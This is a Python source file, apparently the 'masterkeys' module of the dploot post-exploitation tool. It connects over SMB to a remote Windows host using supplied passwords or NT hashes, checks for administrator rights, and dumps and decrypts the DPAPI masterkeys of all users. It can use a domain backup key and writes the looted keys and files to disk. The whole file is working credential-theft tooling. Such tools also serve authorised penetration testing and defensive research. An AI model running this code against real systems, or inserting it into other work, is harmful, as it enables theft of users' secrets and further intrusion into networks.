import argparse
import logging
import os
import sys
from typing import Callable, Dict, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option, parse_file_as_dict
from dploot.triage.masterkeys import MasterkeysTriage


NAME = 'masterkeys'

class MasterkeysAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputfile = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None
        self.outputdir = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_mk)

        if self.options.outputfile is not None and self.options.outputfile != '':
            self.outputfile = self.options.outputfile

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)
    
    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            triage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
            logging.info("Triage ALL USERS masterkeys\n")
            masterkeys = triage.triage_masterkeys()
            if self.outputfile is not None:
                with open(self.outputfile + '.mkf', 'a+')as file:
                    logging.critical("Writting masterkeys to %s" % self.outputfile)
                    for masterkey in masterkeys:
                        masterkey.dump()
                        file.write(str(masterkey)+'\n')
            else:
                for masterkey in masterkeys:
                    masterkey.dump()
            if self.outputdir is not None:
                for filename, bytes in triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)

        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = MasterkeysAction(options)
    a.run()

def parse_masterkeys_options(options: argparse.Namespace, target: Target) -> Tuple[bytes,Dict[str,str],Dict[str,str]]:
    pvkbytes = None
    passwords = {}
    nthashes = {}
    if hasattr(options,'pvk') and options.pvk is not None:
        try:
            pvkbytes = open(options.pvk, 'rb').read()
        except Exception as e:
            logging.error(str(e))
            sys.exit(1)

    if hasattr(options,'passwords') and options.passwords is not None:
        try:
            passwords = parse_file_as_dict(options.passwords)
        except Exception as e:
            logging.error(str(e))
            sys.exit(1)

    if hasattr(options,'nthashes') and options.nthashes is not None:
        try:
            nthashes = parse_file_as_dict(options.nthashes)
        except Exception as e:
            logging.error(str(e))
            sys.exit(1)

    if target.password is not None and target.password != '':
        if passwords is None:
            passwords = dict()
        passwords[target.username] = target.password

    if target.nthash is not None and target.nthash != '':
        if nthashes is None:
            nthashes = dict()
        nthashes[target.username] = target.nthash.lower()

    if nthashes is not None:
        nthashes = {k.lower():v.lower() for k, v in nthashes.items()}
    
    if passwords is not None:
        passwords = {k.lower():v for k, v in passwords.items()}

    return pvkbytes, passwords, nthashes

def add_masterkeys_argument_group(group: argparse._ArgumentGroup) -> None:

    group.add_argument(
        "-pvk",
        action="store",
        help=(
            "Pvk file with domain backup key"
        ),
    )

    group.add_argument(
        "-passwords",
        action="store",
        help=(
            "File containing username:password that will be used eventually to decrypt masterkeys"
        ),
    )

    group.add_argument(
        "-nthashes",
        action="store",
        help=(
            "File containing username:nthash that will be used eventually to decrypt masterkeys"
        ),
    )

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump users masterkey from remote target")

    group = subparser.add_argument_group("masterkeys options")

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-outputfile",
        action="store",
        help=(
            "Export keys to file"
        ),
    )


    group.add_argument(
        "-export-mk",
        action="store",
        metavar="DIR_MASTERKEYS",
        help=(
            "Dump looted masterkey files to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry